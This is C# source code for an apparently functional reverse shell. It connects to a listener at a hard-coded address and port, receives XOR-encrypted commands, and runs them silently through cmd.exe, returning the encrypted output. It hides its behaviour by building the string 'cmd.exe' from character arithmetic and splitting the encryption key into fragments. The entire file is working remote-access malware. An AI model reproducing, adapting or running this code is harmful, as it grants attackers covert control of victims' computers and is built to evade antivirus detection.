using System;
using System.Diagnostics;
using System.Linq;
using System.Management; 
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Text;

namespace rev_shell
{
    class Program
    {	
		
	    
		
	
		static byte[] GetKey() 
        {
            
            string part1 = "Hel";  
            string part2 = "lo";  
            string part3 = "02W";  
            string part4 = "or";
            string part5 = "ld";  
            string part6 = "0d"; 			
            
             
            return Encoding.UTF8.GetBytes(part1 + part2 + part3 + part4 + part5 + part6);
        }
		
		
		
		const string RANDOM_SUFFIX = "ddaw23b3"; 
		static string res = "var_" + RANDOM_SUFFIX;
		
		
        
        static byte[] key = GetKey();

        static void Main(string[] args)
        {
		
			
			
			
			Random random = new Random();
			int r_num = random.Next(0,3110);
			string str = r_num.ToString();
			string full_res = res + str;
			//Console.WriteLine(full_res);
            
			
            string serverAddress = "127.0.0.1";
            int serverPort = 8888;

            try
            {
                using (TcpClient client = new TcpClient(serverAddress, serverPort))
                {
                    //Console.WriteLine("Connected to server.");

                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] buffer = new byte[4096];
                        while (true)
                        {
                            
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            if (bytesRead == 0)
                            {
                                //Console.WriteLine("Server closed the connection.");
                                break;
                            }

                            
                            byte[] decryptedCtrl = Enx(buffer, bytesRead);
                            string ctrl = Encoding.UTF8.GetString(decryptedCtrl, 0, decryptedCtrl.Length).Trim();
                            //Console.WriteLine(String.Format("Received ctrl: {0}", ctrl));

                            
                            string output = E_ctrl(ctrl);

                            
                            byte[] encryptedResponse = Enx(Encoding.UTF8.GetBytes(output));
                            stream.Write(encryptedResponse, 0, encryptedResponse.Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("Error: {0}", ex.Message));
            }
        }

        static string E_ctrl(string ctrl)
        {
            try
            {
                Process temp = new Process(), pro = ((temp != null) ? temp : new Process());
				string fileName = string.Concat(
				(char)(new Random().Next(99, 100)), 
				(char)(110-1), 
				(char)(130-30), 
				'.', 
				(char)(116-15), 
				(char)(122-2), 
				(char)(112-11)
				);
                pro.StartInfo.FileName = fileName;
                pro.StartInfo.Arguments = String.Format("/C {0}", ctrl);
                pro.StartInfo.RedirectStandardOutput = true;
                pro.StartInfo.RedirectStandardError = true;
                pro.StartInfo.UseShellExecute = false;
                pro.StartInfo.CreateNoWindow = true;

                pro.Start();

                string output = pro.StandardOutput.ReadToEnd();
                string error = pro.StandardError.ReadToEnd();

                pro.WaitForExit();

                return string.IsNullOrEmpty(error) ? output : error;
            }
            catch (Exception ex)
            {
                return String.Format("Error executing : {0}", ex.Message);
            }
        }

        
        static byte[] Enx(byte[] data)
        {
            return Enx(data, data.Length);
        }

        static byte[] Enx(byte[] data, int length)
        {
            int keySize = key.Length;
            byte[] result = new byte[length];

            for (int i = 0; i < length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % keySize]);
            }

            return result;
        }
    }
}